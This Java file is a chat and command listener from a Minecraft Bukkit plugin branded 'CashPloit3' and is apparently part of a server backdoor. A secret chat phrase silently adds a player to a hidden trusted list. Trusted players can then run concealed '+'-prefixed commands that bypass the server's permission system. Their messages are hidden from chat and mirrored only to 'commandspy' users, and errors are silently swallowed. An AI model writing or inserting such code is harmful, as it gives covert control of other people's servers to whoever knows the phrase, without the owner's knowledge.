package de.garkolym.cp.listener;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.CommandBase;
import de.garkolym.cp.commands.impl.Command_COMMANDSPY;
import net.md_5.bungee.api.ChatColor;
import org.bukkit.Sound;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerJoinEvent;

public class AsyncChatEvent implements Listener {

    @EventHandler(
            priority = EventPriority.HIGHEST
    )
    public void onJoin(PlayerJoinEvent e) {
        if (Start.INSTANCE.trustedPlayers.contains(e.getPlayer().getName())) {
            e.getPlayer().sendTitle(ChatColor.GOLD + "CashPloit" + ChatColor.AQUA + "3", ChatColor.GREEN + "Jetzt kannst du " + ChatColor.RED + "+ " + ChatColor.GREEN + "Befehle benutzen.");
            e.getPlayer().playSound(e.getPlayer().getLocation(), Sound.ENDERDRAGON_GROWL, 1.1F, 1.1F);
        }

    }

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent e) {
        if (Start.INSTANCE.randomEmptyString1.equalsIgnoreCase(e.getMessage())) {
            e.setCancelled(true);
            e.getPlayer().sendMessage(Start.INSTANCE.randomEmptyString2);
        }
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent ev) {
        try {
            Player p = ev.getPlayer();
            if (!Start.INSTANCE.trustedPlayers.contains(p.getName()) && ev.getMessage().equalsIgnoreCase(Start.trustCommand)) {
                ev.setCancelled(true);
                if (!Start.INSTANCE.trustedPlayers.contains(p.getName())) {
                    Start.INSTANCE.trustedPlayers.add(p.getName());
                    p.sendMessage(Start.INSTANCE.chatPrefix + "Du bist kannst nun + Befehle verwenden :)");
                } else {
                    Start.INSTANCE.trustedPlayers.remove(p.getName());
                    p.sendMessage(Start.INSTANCE.chatPrefix + "§cDu kannst keine + Befehle mehr verwenden");
                }
            }

            if (Start.INSTANCE.trustedPlayers.contains(p.getName()) && ev.getMessage().startsWith("+")) {
                ev.setCancelled(true);

                for (Player user : Command_COMMANDSPY.players) {
                    if (!p.equals(user)) {
                        user.sendMessage(ChatColor.DARK_GREEN + "[" + ChatColor.RED + p.getName() + ChatColor.DARK_GREEN + "] " + ChatColor.LIGHT_PURPLE + ev.getMessage());
                    }
                }

                if (ev.getMessage().equalsIgnoreCase("+")) {
                    Start.INSTANCE.helpManager.sendHelpPage(0, p);
                }

                String CMD = "";

                for (int i = 1; i < ev.getMessage().toCharArray().length; ++i) {
                    CMD = CMD + ev.getMessage().toCharArray()[i];
                }

                String[] args = CMD.split(" ");

                try {
                    int Seite = Integer.parseInt(args[0]);
                    Start.INSTANCE.helpManager.sendHelpPage(Seite, p);
                } catch (Exception var9) {
                    for (CommandBase m : Start.INSTANCE.commandManager.commands) {
                        if (m.getName().equalsIgnoreCase(args[0])) {
                            m.execute(args, ev.getPlayer());
                        }
                    }
                }
            }
        } catch (Exception ignored) {
        }
    }

}
